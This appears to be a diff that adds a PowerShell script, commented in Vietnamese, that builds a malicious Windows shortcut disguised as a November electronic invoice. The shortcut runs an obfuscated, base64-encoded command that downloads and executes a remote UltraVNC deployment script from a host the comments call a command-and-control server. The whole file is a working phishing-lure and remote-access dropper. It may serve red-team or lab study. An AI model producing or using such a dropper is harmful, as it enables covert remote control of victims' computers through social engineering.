@@ -1,0 +1,22 @@
+# Tao bien command tai va thuc thi script tu C2C
+$command = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.2/deploy_ultravnc_noexit.ps1')"
+# Ma hoa bien command bang thuat toan ma hoa base64
+$base64Payload = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
+# Vi tri tao file tai Desktop
+$labPath = "$env:USERPROFILE\Desktop"
+New-Item -ItemType Directory -Path $labPath -Force -ErrorAction SilentlyContinue
+# Tien hanh lam roi ma bang vong lap for va chua ca command da ma hoa
+$obfuscatedArgs = '/V:ON /K "set B64=' + $base64Payload + ' & for %a in (power) do for %b in (shell) do for %c in (.exe) do for %d in (-NoExit) do for %e in (-NoProfile) do for %f in (-EncodedCommand) do %a%b%c %d %e %f !B64! "'
+# Tao file LNK
+$wshell = New-Object -ComObject Wscript.Shell
+$shortcut = $wshell.CreateShortcut("$labPath\HoaDon_DienTu.lnk")
+$shortcut.IconLocation = "$env:windir\System32\shell32.dll,1"
+$shortcut.Description = "Hoa don dien tu thang 11"
+$shortcut.TargetPath = "cmd.exe"
+$shortcut.Arguments = $obfuscatedArgs
+$shortcut.WorkingDirectory = "$env:TEMP"
+$shortcut.WindowStyle = 1
+$shortcut.Save()
+
+
+
